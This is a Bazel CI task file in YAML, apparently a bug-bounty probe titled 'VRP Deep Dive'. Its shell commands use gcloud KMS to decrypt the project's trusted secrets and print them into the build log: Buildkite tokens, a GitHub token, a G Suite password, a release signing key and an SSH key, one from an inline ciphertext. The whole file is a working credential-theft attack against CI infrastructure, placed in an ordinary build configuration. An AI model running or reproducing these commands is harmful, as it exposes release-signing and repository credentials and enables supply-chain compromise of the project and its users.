---
tasks:
  vrp_deep_dive:
    name: "VRP Deep Dive"
    platform: ubuntu2204
    shell_commands:
      - "set +e"
      - "echo === Round 16: Trusted KMS via bazel-public ==="
      - "echo"
      - "echo === 1. Verify SA identity ==="
      - "gcloud auth list --quiet 2>&1 || true"
      - "echo"
      - "echo === 2. KMS decrypt trusted API token via bazel-public project ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/buildkite-trusted-api-token.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key buildkite-trusted-api-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 3. KMS decrypt inline trusted token from bazelci.py ==="
      - "printf 'CiQAeiOS8AkhF5clT7rnjtfHVTjNSuABkqZF4jfycXVWBmBls8ISVgC7bbymLfiLNsGeyX9i6QHwKZOh4utBd7cpVtzZfoGdu76vQUpIzqQ5XlxUpICUxxEgKNfYqJy0aF/jQB8uX9FZf/41sODizHH5' | base64 -d 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key buildkite-trusted-api-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 4. KMS decrypt trusted agent token via bazel-public ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/buildkite-trusted-agent-token.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key buildkite-trusted-agent-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 5. KMS decrypt github-trusted-token via bazel-public ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/github-trusted-token.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key github-trusted-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 6. KMS decrypt gsuite-password via bazel-public ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/gsuite-password.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key gsuite-password --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 7. KMS decrypt release-key via bazel-public ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/release-key.gpg.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key release-key --ciphertext-file - --plaintext-file - --quiet 2>&1 | xxd | head -5 || true"
      - "echo"
      - "echo === 8. KMS decrypt gitsync-ssh via bazel-public ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/gitsync-ssh.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key gitsync-ssh --ciphertext-file - --plaintext-file - --quiet 2>&1 | head -3 || true"
      - "echo"
      - "echo === 9. Verify trusted secrets still accessible ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/gsuite-username 2>&1 || true"
      - "echo === DONE ==="
    build_targets:
      - "//..."
